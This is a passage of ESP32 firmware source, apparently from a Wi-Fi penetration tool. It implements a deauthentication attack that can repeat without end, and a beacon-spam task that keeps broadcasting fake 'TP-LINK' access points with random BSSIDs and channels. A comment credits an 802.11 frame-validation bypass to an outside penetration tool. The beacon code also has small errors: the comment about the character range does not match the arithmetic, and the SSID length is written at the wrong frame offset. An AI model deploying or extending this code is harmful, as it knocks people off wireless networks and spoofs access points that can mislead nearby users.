        ESP_LOGE("DEAUTH", "Failed to send deauth frame: %s", esp_err_to_name(ret));
    }
}

/*===========================================================================
 * 命令处理函数: DEAUTH ATTACK
 *   repeat_count = 0 → 无限循环直到收到停止命令
 *   repeat_count > 0 → 发送指定次数
 *===========================================================================*/

static void _handler_deauth_attack(const wifi_task_queue_message_t *msg)
{
    const wifi_cmd_deauth_params_t *p = &msg->params.deauth;
    uint16_t interval = (p->interval_ms > 0) ? p->interval_ms : 100;

    if (p->repeat_count == 0) {
        xEventGroupSetBits(s_wifi_event_group, WIFI_DEAUTH_BIT);
    } else {
        for (uint16_t i = 0; i < p->repeat_count; i++) {
            WIFI_deauth_attack(p->ap_bssid, NULL, p->reason_code);
            if (i < p->repeat_count - 1) {
                vTaskDelay(pdMS_TO_TICKS(interval));
            }
        }
    }

    ESP_LOGI(TAG, "Deauth finished");
}


static void _handler_beacon_spam_start(const wifi_task_queue_message_t *msg)
{

}

static void _handler_beacon_spam_stop(const wifi_task_queue_message_t *msg)
{

}


wifi_result_code_t WIFI_send_cmd(wifi_cmd_type_t cmd, const void *params,
                                    TaskHandle_t reply_task, uint32_t req_id)
{
    if (wifi_task_queue == NULL) {
        return WIFI_RESULT_ERR_STATE;
    }

    wifi_task_queue_message_t msg = {
        .cmd_type   = cmd,
        .request_id = (req_id != 0) ? req_id : 0,
        .reply_task = reply_task,
    };
    if (params != NULL) {
        memcpy(&msg.params, params, sizeof(msg.params));
    }

    if (xQueueSend(wifi_task_queue, &msg, pdMS_TO_TICKS(100)) != pdTRUE) {
        return WIFI_RESULT_ERR_TIMEOUT;
    }
    return WIFI_RESULT_OK;
}











// Force disable 802.11 frame validation (allows sending malformed frames) from https://github.com/risinek/esp32-wifi-penetration-tool/blob/master/components/wsl_bypasser/wsl_bypasser.c

// Beacon frame template definition (IEEE802.11 management frame structure)
uint8_t beaconPacket[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source Repeat

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
  /* 34 - 35 */ 0x21, 0x00, // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82, // 1(B)
  /* 73 */ 0x84, // 2(B)
  /* 74 */ 0x8b, // 5.5(B)
  /* 75 */ 0x96, // 11(B)
  /* 76 */ 0x24, // 18
  /* 77 */ 0x30, // 24
  /* 78 */ 0x48, // 36
  /* 79 */ 0x6c, // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
  /* 82 */      0x01,       // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};


void task_wifi_beacon_spam(void *arg) {
    ESP_LOGI("beacon_spam","Starting beacon spammer");
    char name_buffer[SSID_MAX_LEN + 1];
    char suffix_buffer[16] = {0};

    // 预计算数据包字段指针 | Precompute pointers to frequently accessed packet fields
    uint8_t *ssid_ptr = beaconPacket + 38;
    uint8_t *channel_ptr = beaconPacket + 82;
    uint8_t *bssid_ptr = beaconPacket + 10;
    while(1){
        // Generate random suffix
        suffix_buffer[0] = 0x20;
        for(int i = 1; i < 15; i++)
            suffix_buffer[i] = esp_random() % 79 + 48; // 0x20-0x7E range
        // Generate SSID with bounds checking
        snprintf(name_buffer, sizeof(name_buffer), "%s%s",
                "TP-LINK_EE0A", suffix_buffer);
        // Update beacon packet
        size_t ssid_len = strnlen(name_buffer, SSID_MAX_LEN);
        memcpy(ssid_ptr, name_buffer, ssid_len);
        beaconPacket[37] = ssid_len;

        // 生成随机MAC地址 | Generate random BSSID
        esp_fill_random(bssid_ptr, MAC_LEN);
        memcpy(beaconPacket + 16, bssid_ptr, MAC_LEN);
        // Random channel selection with uniform distribution
        *channel_ptr = esp_random() % (CHANNEL_MAX - CHANNEL_MIN + 1) + CHANNEL_MIN;
        // Transmit packets
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 109, 0);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}

